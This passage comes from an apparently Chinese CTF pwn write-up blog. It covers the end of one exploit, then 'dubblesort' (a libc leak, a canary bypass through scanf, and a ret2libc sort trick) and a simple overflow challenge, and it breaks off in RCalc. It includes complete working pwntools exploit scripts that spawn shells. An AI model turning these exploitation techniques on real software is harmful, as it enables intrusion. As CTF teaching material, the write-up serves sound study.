class="line">addr__IO_buf_base = addr__IO_2_1_stdin_ + <span class="number">0x38</span></span><br><span class="line">addr__shortbuf = addr__IO_2_1_stdin_ + <span class="number">0x83</span></span><br><span class="line">addr_system = libcbase + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">addr_bin_sh = libcbase + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">addr_rdi_ret = mainbase + <span class="number">0xd93</span></span><br><span class="line"></span><br><span class="line">set_name(p64(addr__IO_buf_base))</span><br><span class="line">echo_back(<span class="string">'%16$hhn'</span>)</span><br><span class="line">pd = p64(addr__shortbuf) * <span class="number">3</span></span><br><span class="line">pd += p64(addr_ret)</span><br><span class="line">pd += p64(addr_ret + <span class="number">0x18</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'choice&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">p.sendafter(<span class="string">'length:'</span>, pd)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">0x27</span>):</span><br><span class="line">    info(hex(i)[<span class="number">2</span>:])</span><br><span class="line">    p.sendlineafter(<span class="string">'choice&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'length:'</span>, <span class="string">''</span>)</span><br><span class="line">pd = p64(addr_rdi_ret)</span><br><span class="line">pd += p64(addr_bin_sh)</span><br><span class="line">pd += p64(addr_system)</span><br><span class="line">p.sendlineafter(<span class="string">'choice&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'length:'</span>, pd)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line">success(<span class="string">'addr_ret               = '</span> + hex(addr_ret))</span><br><span class="line">success(<span class="string">'addr_rdi_ret           = '</span> + hex(addr_rdi_ret))</span><br><span class="line">success(<span class="string">'addr__IO_buf_base      = '</span> + hex(addr__IO_buf_base))</span><br><span class="line">p.sendlineafter(<span class="string">'choice&gt;&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag-14"><a href="#Flag-14" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="dubblesort"><a href="#dubblesort" class="headerlink" title="dubblesort"></a>dubblesort</h2><h3 id="Description-15"><a href="#Description-15" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>暂无</p>
</blockquote>
<hr>
<h3 id="Solution-15"><a href="#Solution-15" class="headerlink" title="Solution:"></a>Solution:</h3><p>真正的保护全开</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>

<p><strong>main 函数：</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v4; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// et1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// [esp+18h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+1Ch] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+3Ch] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// [esp+7Ch] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  v15 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  sub_8B5();</span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">"What your name :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">"Hello %s,How many numbers do you what to sort :"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%u"</span>, &amp;v12);</span><br><span class="line">  v3 = v12;</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = &amp;v13;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1</span>, <span class="string">"Enter the %d number : "</span>);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%u"</span>, v4);</span><br><span class="line">      ++v5;</span><br><span class="line">      v3 = v12;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v12 &gt; v5 );</span><br><span class="line">  &#125;</span><br><span class="line">  sub_931(&amp;v13, v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Result :"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *(&amp;v13 + v7);</span><br><span class="line">      __printf_chk(<span class="number">1</span>, <span class="string">"%u "</span>);</span><br><span class="line">      ++v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v12 &gt; v7 );</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v10 = v11 ^ v15;</span><br><span class="line">  <span class="keyword">if</span> ( v11 != v15 )</span><br><span class="line">    sub_BA0(v6, v10);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>能看到定义的 buf 变量不是 char 数组而是 char 字符，那栈中肯定有很多数据，gdb 泄露出来数据如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0f:003c│ <span class="built_in">ecx</span> <span class="built_in">esi</span>  <span class="number">0xffffd03c</span> ← <span class="number">0xa61</span> /* <span class="string">'a\n'</span> */</span><br><span class="line"><span class="number">10</span>:<span class="number">0040</span>│          <span class="number">0xffffd040</span> → <span class="number">0xffffd31b</span> ← <span class="string">'/root/CTF/Pwn/dubblesort'</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0044</span>│          <span class="number">0xffffd044</span> ← <span class="number">0x2f</span> /* <span class="string">'/'</span> */</span><br><span class="line"><span class="number">12</span>:<span class="number">0048</span>│          <span class="number">0xffffd048</span> → <span class="number">0x56555034</span> ← <span class="keyword">push</span>   <span class="built_in">es</span></span><br><span class="line"><span class="number">13</span>:004c│          <span class="number">0xffffd04c</span> ← <span class="number">0x16</span></span><br><span class="line"><span class="number">14</span>:<span class="number">0050</span>│          <span class="number">0xffffd050</span> ← <span class="number">0x8000</span></span><br><span class="line"><span class="number">15</span>:<span class="number">0054</span>│          <span class="number">0xffffd054</span> → <span class="number">0xf7fae000</span> (_GLOBAL_OFFSET_TABLE_) ← <span class="number">0x1b1db0</span></span><br><span class="line"><span class="number">16</span>:<span class="number">0058</span>│          <span class="number">0xffffd058</span> → <span class="number">0xf7fac244</span> → <span class="number">0xf7e14020</span> (_IO_check_libio) ← <span class="keyword">call</span>   <span class="number">0xf7f1bb59</span></span><br><span class="line"><span class="number">17</span>:005c│          <span class="number">0xffffd05c</span> → <span class="number">0x56555601</span> ← <span class="keyword">add</span>    <span class="built_in">ebx</span>, <span class="number">0x199f</span></span><br><span class="line"><span class="number">18</span>:<span class="number">0060</span>│          <span class="number">0xffffd060</span> → <span class="number">0x565557a9</span> ← <span class="keyword">add</span>    <span class="built_in">ebx</span>, <span class="number">0x17f7</span></span><br><span class="line"><span class="number">19</span>:<span class="number">0064</span>│          <span class="number">0xffffd064</span> → <span class="number">0x56556fa0</span> ← <span class="number">0x1ea8</span></span><br><span class="line">1a:<span class="number">0068</span>│          <span class="number">0xffffd068</span> ← <span class="number">0x1</span></span><br><span class="line"><span class="number">1b</span>:006c│          <span class="number">0xffffd06c</span> → <span class="number">0x56555b72</span> ← <span class="keyword">add</span>    <span class="built_in">edi</span>, <span class="number">1</span></span><br><span class="line">1c:<span class="number">0070</span>│          <span class="number">0xffffd070</span> ← <span class="number">0x1</span></span><br><span class="line"><span class="number">1d</span>:<span class="number">0074</span>│          <span class="number">0xffffd074</span> → <span class="number">0xffffd134</span> → <span class="number">0xffffd31b</span> ← <span class="string">'/root/CTF/Pwn/dubblesort'</span></span><br><span class="line">1e:<span class="number">0078</span>│          <span class="number">0xffffd078</span> → <span class="number">0xffffd13c</span> → <span class="number">0xffffd334</span> ← <span class="string">'LC_PAPER=zh_CN.UTF-8'</span></span><br><span class="line">1f:007c│          <span class="number">0xffffd07c</span> ← <span class="number">0x433ba800</span></span><br></pre></td></tr></table></figure>

<p>这里可以看出，假如我们能够输入 24 个字符，就可以依靠<code>\n</code>泄露出<code>0xffffd054</code>处的数据</p>
<p>而这个数据和 libc 的基地址是有固定关系的，所以我们可以靠这个数据算出 libc 的基地址</p>
<p>之后就是该考虑如何提权了，当 scanf 函数接收到不符合格式化字符串的字符时，不会将其放入栈空间中</p>
<p>所以我们可以在 canary 处输入特殊字符，英文啊，<code>+-</code>啊等等，这样 canary 处的数据就不会被修改，但是当进行排序的时候，会将这块排序</p>
<p>之后再输入很多 system 的真实地址到<code>__libc_start_main+240</code>，再加上 str_bin_sh 的地址即可，最后一波排序后即可提权</p>
<p>能这样的原因是：正常来讲数值关系的话 canary &lt; addr_system &lt; addr_bin_sh</p>
<p>所以输入的数据从 canary 开始就是已经排序好的，不会改动，也就完成了栈布局</p>
<p><strong>exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="comment"># context(log_level="debug", arch="i386", os="linux")</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./dubblesort'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    offset_libc = <span class="number">0x1B200A</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">38568</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc_32.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    offset_libc = <span class="number">0x1B000A</span></span><br><span class="line">elf = ELF(<span class="string">'./dubblesort'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *$rebase(0xB10)\nc")</span></span><br><span class="line">pd = <span class="string">'a'</span> * <span class="number">24</span></span><br><span class="line">p.sendlineafter(<span class="string">'What your name :'</span>, pd)</span><br><span class="line">p.recvuntil(pd)</span><br><span class="line"></span><br><span class="line">libcbase = u32(p.recv(<span class="number">4</span>)) - offset_libc</span><br><span class="line">addr_system = libcbase + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">addr_bin_sh = libcbase + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">addr___libc_start_main = libcbase + libc.sym[<span class="string">'__libc_start_main'</span>] + <span class="number">247</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'do you what to sort :'</span>, <span class="string">'35'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">24</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'number : '</span>, <span class="string">'0'</span>)</span><br><span class="line">success(<span class="string">'libcbase               = '</span> + hex(libcbase))</span><br><span class="line">success(<span class="string">'addr_system            = '</span> + hex(addr_system))</span><br><span class="line">success(<span class="string">'addr_bin_sh            = '</span> + hex(addr_bin_sh))</span><br><span class="line">success(<span class="string">'addr___libc_start_main = '</span> + hex(addr___libc_start_main))</span><br><span class="line">p.sendlineafter(<span class="string">'number : '</span>, <span class="string">'+'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">9</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'number : '</span>, str(addr_system))</span><br><span class="line">p.sendlineafter(<span class="string">'number : '</span>, str(addr_bin_sh))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag-15"><a href="#Flag-15" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="反应釜开关控制"><a href="#反应釜开关控制" class="headerlink" title="反应釜开关控制"></a>反应釜开关控制</h2><h3 id="Description-16"><a href="#Description-16" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>小M在里一个私人矿厂中发现了一条TNT生产线中硝化反应釜的接口，反应釜是一种反应设备，非常的不稳定，会因为很多原因造成损坏，导致生产被迫停止。她怀疑这个工厂可能进行地下军火的制作，所以小M打算通过把反应釜关闭掉来干扰这条TNT生产线的运行，但是反应釜有多个闸门，得想办法帮她把闸门都关掉才行。</p>
</blockquote>
<hr>
<h3 id="Solution-16"><a href="#Solution-16" class="headerlink" title="Solution:"></a>Solution:</h3><p>水题</p>
<p><strong>exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="comment"># context(log_level="debug", arch="amd64", os="linux")</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">36956</span>)</span><br><span class="line">pd = <span class="string">'a'</span> * <span class="number">0x208</span></span><br><span class="line">pd += p64(<span class="number">0x4005F6</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;'</span>, pd)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag-16"><a href="#Flag-16" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="RCalc"><a href="#RCalc" class="headerlink" title="RCalc"></a>RCalc</h2><h3 id="Description-17"><a href="#Description-17" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>暂无</p>
</blockquote>
<hr>
<h3 id="Solution-17"><a href="#Solution-17" class="headerlink" title="Solution:"></a>Solution:</h3><p>题目一开始创建了很多堆，用来存放堆的两个地址在后面起到控制随机数的作用</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">sub_400A06</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  qword_6020F8 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_6020F8 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  qword_6020F0 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_6020F0 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  *qword_6020F8 = <span class="number">0L</span>L;</span><br><span class="line">  v0 = qword_6020F8;</span><br><span class="line">  *(v0 + <span class="number">8</span>) = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  *qword_6020F0 = <span class="number">0L</span>L;</span><br><span class="line">  v1 = qword_6020F0;</span><br><span class="line">  result = <span class="built_in">malloc</span>(<span class="number">0x320</span>uLL);</span><br><span class="line">  *(v1 + <span class="number">8</span>) = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时堆空间分布如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x603000</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x21</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x603050</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x21</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603020</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x21</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x603160</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x111</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603040</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x111</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603150</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x331</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603480</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x20b81</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以这里 qword_6020F8 的值为 0x603010，qword_6020F0 的值为 0x603030，这是两个堆空间的 fd 地址</p>
<p>接着将 0x603008 也就是 qword_6020F8 对应堆的 bk 设置为新创建的大小为 0x100 堆的 fd 地址</p>
<p>再将 0x603028 也就是 qword_6020F0 对应堆的 bk 设置为新创建的大小为 0x320 堆的 fd 地址</p>
<p>接着到了主函数，主函数一开始还有小操作</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_400AAB</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v1; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ptr; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *qword_6020F0 )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = *(*(qword_6020F0 + <span class="number">8</span>) + <span class="number">8L</span>L * *qword_6020F0 - <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(<span class="string">"/dev/urandom"</span>, <span class="string">"r"</span>);</span><br><span class="line">    fread(&amp;ptr, <span class="number">1u</span>LL, <span class="number">4u</span>LL, stream);</span><br><span class="line">    fclose(stream);</span><br><span class="line">  &#125;</span><br><span class="line">  srand(ptr);</span><br><span class="line">  v4 = rand();</span><br><span class="line">  v4 = (v4 &lt;&lt; <span class="number">32</span>) | rand();</span><br><span class="line">  v0 = *(qword_6020F0 + <span class="number">8</span>);</span><br><span class="line">  v1 = (*qword_6020F0)++;</span><br><span class="line">  *(v0 + <span class="number">8</span> * v1) = v4;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里将随机数存到了大小为 0x320 的堆的 fd 地址加上 8 * v1 的地址上，然后将第二个堆的 fd 上面的值自增 1</p>
<p><strong>重点一：</strong></p>
<p>接着就是主函数内部了，这里 scanf 有个漏洞点，可以写入无限长的字符串导致溢出，但是有一个检查</p>
<p>如果 result 的值不等于随机数的值，那么就退出程序，相当于他自己设置的 canary</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_400FA2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+0h] [rbp-110h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = sub_400AAB();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Input your name pls: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello %s!\nWelcome to RCTF 2017!!!\n"</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Let's try our smart calculator"</span>);</span><br><span class="line">  sub_400E72(<span class="string">"Let's try our smart calculator"</span>);</span><br><span class="line">  result = sub_400B92();</span><br><span class="line">  <span 